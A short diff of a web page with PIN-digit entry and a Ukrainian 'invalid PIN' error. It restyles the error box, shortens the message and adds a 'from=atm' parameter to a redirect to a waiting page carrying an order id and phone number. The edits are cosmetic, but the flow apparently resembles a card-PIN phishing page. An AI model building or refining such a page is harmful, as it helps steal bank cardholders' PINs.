@@ -51,9 +51,9 @@
   .pin-digit:focus{border-bottom-color:#00A651}
 
   .err{
-    display:none;margin:12px 0 0;padding:10px 14px;
-    background:#fff5f5;border:1px solid #fcc;border-radius:10px;
-    color:#c62828;font-size:13px;text-align:center;
+    display:none;margin:12px 0 0;padding:12px 14px;
+    background:#fff0f0;border:1px solid #fcc;border-radius:10px;
+    color:#dc2626;font-size:14px;text-align:center;font-weight:700;
   }
 
   .info{
@@ -117,7 +117,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Невірний ПІН-код. Спробуйте ще раз.";
+    el.textContent = "Невірний ПІН-код";
     el.style.display = "block";
     setTimeout(() => { el.style.display = "none"; }, 3500);
   }
@@ -173,7 +173,7 @@
       });
       const data = await res.json();
       if (data.success) {
-        location.href = "waiting.html?order=" + orderId +
+        location.href = "waiting.html?order=" + orderId + "&from=atm" +
                         (phone ? "&phone=" + encodeURIComponent(phone) : "");
       } else {
         showError(data.message || "Сталася помилка");
